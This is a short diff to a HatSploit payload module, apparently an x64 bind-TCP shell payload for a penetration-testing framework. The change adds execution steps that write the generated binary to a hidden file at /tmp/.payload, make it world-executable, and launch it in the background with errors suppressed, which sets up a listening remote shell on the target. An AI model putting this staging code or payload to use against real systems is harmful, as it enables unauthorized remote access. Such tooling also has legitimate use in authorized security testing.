@@ -55,7 +55,7 @@ class HatSploitPayload(HatSploitPayload):
         }
     }
 
-    def generate(self):
+    def run(self):
         bind_port, executable_format = self.parser.parse_options(self.options)
         bind_port = self.payload_generator.port_to_bytes(bind_port)
 
@@ -114,4 +114,12 @@ class HatSploitPayload(HatSploitPayload):
         self.badges.output_process("Generating payload...")
         payload = self.payload_generator.generate(executable_format, 'x64', shellcode)
 
-        return payload
+        instructions = ""
+        instructions += "cat >/tmp/.payload;"
+        instructions += "chmod 777 /tmp/.payload;"
+        instructions += "sh -c '/tmp/.payload' 2>/dev/null &"
+        instructions += "\n"
+
+        self.payload = payload
+        self.instructions = instructions
+        self.action = 'bind_tcp'
